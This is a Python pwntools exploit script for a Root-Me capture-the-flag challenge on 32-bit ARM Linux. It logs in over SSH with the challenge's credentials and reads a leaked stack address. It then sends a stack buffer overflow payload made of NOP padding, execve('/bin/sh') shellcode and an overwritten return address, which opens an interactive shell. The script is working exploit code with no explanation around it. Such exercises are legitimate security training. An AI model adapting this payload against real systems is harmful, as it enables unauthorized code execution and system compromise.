#!/usr/bin/env python

from pwn import *

context.clear(arch="arm", os="linux", bits=32, log_level="debug")

shellcode="\x2f\x73\x07\xe3\x68\x70\x40\xe3\x04\x70\x2d\xe5\x2f\x72\x06\xe3\x69\x7e\x46\xe3\x04\x70\x2d\xe5\x0d\x00\xa0\xe1\x01\x10\x21\xe0\x02\x20\x22\xe0\x0b\x70\xa0\xe3\x00\x00\x00\xef"

def pwn():
    s=ssh(user="app-systeme-ch45", host="challenge04.root-me.org", password="app-systeme-ch45", port=2224)
    t=s.process("./ch45")
    t.recvuntil("dump:")
    t.sendline("A"*4)
    stack=int(t.recvlines(2)[1].split(":")[0], 16)
    log.info("Stack address: 0x{:08x}".format(stack))
    t.recvuntil(":")
    t.sendline("\x90"*16+shellcode+"A"*(164-(len(shellcode)+16))+p32(stack))
    t.interactive()
if __name__=="__main__":
    pwn()

